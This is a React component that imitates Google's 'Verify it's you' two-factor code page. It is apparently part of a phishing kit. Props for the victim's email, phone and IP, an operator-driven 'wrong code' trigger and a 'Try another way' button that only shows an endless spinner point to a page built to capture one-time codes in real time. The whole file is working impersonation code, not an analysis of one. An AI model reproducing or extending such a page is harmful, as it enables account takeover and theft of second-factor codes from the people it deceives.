import React, { useState } from "react";
import GoogleShell, {
  GTitle,
  GBody,
  GError,
  GoogleInput,
  GoogleSpinner,
  NextButton,
  TextButton,
  GContent,
  GLeft,
  GRight,
  GActions,
} from "./GoogleShell";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import { GOOGLE_CONFIG } from "../../utils/googleConfig";

/**
 * Shared Google "Verify it's you" code challenge page.
 * Used by SMS / voice call / authenticator app / backup code views.
 */
export default function GoogleCodeChallenge({
  Unik,
  setStep,
  Email,
  Tel,
  Ip,
  LastFetch,
  wrong2faTrigger,
  description,
  dataField,
  componentName,
  initialMessage,
  codePlaceholder = "Enter code",
}) {
  const [navLoading, setNavLoading] = useState(false);
  const [showWaiting, setShowWaiting] = useState(false);

  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName,
    initialMessage,
    allowImmediateRetry: true,
  });

  const handleFormSubmit = (e) => {
    handleSubmit(e, dataField);
  };

  const handleTryAnotherWay = () => {
    if (showWaiting || isLoading) return;
    setShowWaiting(true);
  };

  if (showWaiting) {
    return (
      <GoogleShell initialLoading={false}>
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: 300, gap: 24 }}>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>Looking for more options…</GBody>
        </div>
      </GoogleShell>
    );
  }

  return (
    <GoogleShell>
      <GContent>
        <GLeft>
          <GTitle>Verify it&rsquo;s you</GTitle>
          <GBody>{description}</GBody>
        </GLeft>
        <GRight>
          <form id="google-code-form" onSubmit={handleFormSubmit}>
            <GoogleInput
              label={codePlaceholder}
              name={dataField}
              value={code}
              onChange={handleCodeChange}
              error={shouldShowRedBorder()}
              disabled={isLoading || navLoading}
              autoFocus
              autoComplete="one-time-code"
            />
            {showError && <GError>Wrong code. Try again.</GError>}
          </form>
        </GRight>
      </GContent>
      <GActions>
        <TextButton
          type="button"
          onClick={handleTryAnotherWay}
          disabled={isLoading || navLoading}
        >
          {navLoading ? <GoogleSpinner size={16} /> : "Try another way"}
        </TextButton>
        <NextButton
          type="submit"
          form="google-code-form"
          disabled={isButtonDisabled() || navLoading}
        >
          {isLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
        </NextButton>
      </GActions>
    </GoogleShell>
  );
}
